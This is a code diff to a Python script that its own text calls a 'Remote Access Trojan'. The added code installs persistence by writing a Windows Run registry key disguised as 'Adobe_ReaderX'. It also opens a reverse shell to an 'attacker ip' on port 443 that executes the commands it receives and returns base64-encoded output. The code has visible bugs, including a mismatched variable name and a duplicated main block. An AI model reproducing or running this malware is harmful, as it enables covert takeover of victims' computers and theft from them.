@@ -7,6 +7,9 @@ from twisted import mail
 import ImageGrab
 import os
 import time
+import sys, base64, os, socket, subprocess
+from _winreg import *
+
 
 def screenGrab():
     box = ()
@@ -26,16 +29,52 @@ def collect_files():
 	"""
 	pass
 
-def send_filesvia_email():
-	"""
-	send all files returned by collect_files to the specified email.
-	"""
-	pass
+def autorun(tempdir, fileName, run):
+	os.system('copy %s %s'%(fileName,tmpdir))
+	key = OpenKey(HKEY_LOCAL_MACHINE,run)
+	runkey = []
+	try:
+		i = 0
+		while True:
+			subkey = EnumValue(key,i)
+			runkey.append(subkey[0])
+			i += 1
+	except WindowsError:
+		pass
+
+	if 'Adobe ReaderX' not in runkey:
+		try:
+			key = OpenKey(HKEY_LOCAL_MACHINE,run,0,KEY_ALL_ACCESS)
+			SetValueEx(key,'Adobe_ReaderX',0,REG_SZ,r"%TEMP%\mw.exe")
+			key.Close()
+		except WindowsError:
+			pass
+
+def shell():
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.connect(('attacker ip',int(443)))
+	s.send('[*] Connection Established!')
+	while 1:
+		data = s.recv(512)
+		if data == "quit": break
+		proc = subprocess.Popen(data,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
+		stdout_value = proc.stdout.read() + proc.stderr.read()
+		encoded = base64.b64encode(stdout_value)
+		s.send(encoded)
+		s.close()
 
 def main():
-	print "Remote Access Trojan V 0.0.1\n"
-	screenGrab()
-	file_extensions = ['.pdf','.docx','.xlfs','.ppsx'] #file extensions to be searched for and uploaded.
+	#screenGrab()
+	#file_extensions = ['.pdf','.docx','.xlfs','.ppsx'] #file extensions to be searched for and uploaded.
+	tempdir = '%TEMP%'
+	fileName = sys.argv[0]
+	run = "Software\Microsoft\Windows\CurrentVersion\Run"
+	autorun(tempdir,fileName,run)
+	shell()
+
+if __name__ == "__main__":
+	main()
+
 
 if __name__ == '__main__':
     main()
